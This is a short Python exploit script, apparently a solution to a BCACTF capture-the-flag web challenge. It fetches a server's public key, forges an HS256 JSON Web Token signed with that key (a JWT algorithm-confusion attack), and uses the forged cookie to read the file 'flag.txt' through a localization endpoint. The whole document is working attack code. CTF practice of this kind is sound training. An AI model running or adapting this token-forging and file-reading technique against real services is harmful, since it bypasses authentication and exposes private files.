#!/usr/bin/env python3
import sys
import requests
import hmac
import hashlib
import base64
from base64 import urlsafe_b64encode
import json

base_url = 'http://web.bcactf.com:49159'

def fetch_public_key():
    res = requests.post(
        base_url + '/localization-language',
        data = { 'language': 'key' },
        allow_redirects=False
    )

    if res.status_code != 302:
        print('bad token gen')
        print(res.text)
        sys.exit(1)

    # Use cookie to fetch file
    res = requests.get(base_url + '/localisation-file', cookies=res.cookies)
    return res.text

def forge_hmac_jwt(public_key, lang):
    header = json.dumps({ 'typ': 'JWT', 'alg': 'HS256' }, separators=(',', ':')).encode('utf8')
    body = json.dumps({ 'language': lang, 'iat': 1623426935 }, separators=(',', ':')).encode('utf8')
    unsigned_token = urlsafe_b64encode(header).decode().strip('=') + '.' + urlsafe_b64encode(body).decode().strip('=')
    sig = hmac.new(public_key.encode('utf8'), unsigned_token.encode('utf8'), hashlib.sha256).digest()
    return unsigned_token + '.' + urlsafe_b64encode(sig).decode('utf8').strip('=')

def fetch_file_with_token(token):
    cookies = { 'lion-token': token }
    res = requests.get(base_url + '/localisation-file', cookies=cookies)
    return res.text

def exploit():
    pubk = fetch_public_key()
    print("Public Key:")
    print(pubk)
    print("="*32)
    tok = forge_hmac_jwt(pubk, 'flag.txt')
    print("Forged Token:")
    print(tok)
    print("="*32)
    flag = fetch_file_with_token(tok)
    print("Flag:")
    print(flag)

exploit()
